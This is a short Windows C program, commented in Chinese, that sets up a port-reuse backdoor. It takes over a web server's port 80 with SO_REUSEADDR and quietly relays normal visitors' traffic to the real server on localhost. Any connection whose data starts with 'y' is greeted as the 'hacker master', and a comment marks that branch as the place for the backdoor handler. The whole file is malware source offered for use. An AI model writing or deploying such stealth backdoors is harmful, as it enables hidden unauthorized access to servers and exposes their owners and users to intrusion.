#include <stdio.h>
#include <WINSOCK2.H> //加入SOCKET的头文件与链接库
#pragma comment (lib,"Ws2_32.lib")

//复用端口程序包包含监听与连接两种功能的SOCKET

void proc(LPVOID d); //工作线程

int main(int argc,char *argv[])
{
	//初始化SOCKET参数
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2),&wsaData); //socket版本
	
	SOCKADDR_IN a,b; //一个是用于外部监听的地址，一个是接收到accept时用的用于处理接收的结构
	a.sin_family = AF_INET;
	a.sin_addr.s_addr=inet_addr(argv[1]);
	a.sin_port = htons(80);
	
	SOCKET c; //socket c是用于监听的SOCKET
	c=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	bool l = TRUE;
	setsockopt(c,SOL_SOCKET,SO_REUSEADDR,(char *)&l,sizeof(l)); //重用端口设置
	bind(c,(sockaddr*)&a,sizeof(a));//绑定
	listen(c,100); //监听
	
	while(1)
	{
		int x;
		x = sizeof(b);
		SOCKET d = accept(c,(sockaddr*)&b,&x);//socket d是当接收到连接时用的socket,监听的sokcet只有一个，
		//则处理接收到的socket可有多个，由连接数决定
		CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)proc,(LPVOID)d,0,0);
	}
	closesocket(c);
	return 0;
	
}

void proc(LPVOID d)
{
	SOCKADDR_IN sa; //用于连接WEB 80 端口的SOCKET的结构（这个相当于客户端程序，向外服务端连接）,
	//向外连接SOCKET只有一个
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	sa.sin_port = htons(80);
	SOCKET web = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	connect(web,(sockaddr*)&sa,sizeof(sa)); //用此线程程序连接web
	char buf[4096];
	SOCKET ss = (SOCKET)d; //把传进来的处理连接的SOCKET赋给ss
	while(1)
	{
		int n = recv(ss,buf,4096,0);//从外部连接d(即SS)收到数据
		if(n==0) //没有数据
			break;
		if(n>0 && buf[0] =='y')
		{
			send(ss,"hello!,my hacker master!",25,0);//后门处理程序放在这
		}
		else
		{
			send(web,buf,n,0);//如果不是HACKER发来的信息，把信息发给WEB服务程序（在服务器内部,用127.0.0.1）
			n=recv(web,buf,4096,0);//接收到正常服务程序返回的信息
			if(n==0) //如果正常服务器程序没有返回信息，则退出
				break;
			else
				send(ss,buf,n,0);//否则则把服务器正常信息发给客户端（相当于客户端是没有恶意行为的用户）
		}
	}
	closesocket(ss);
	
}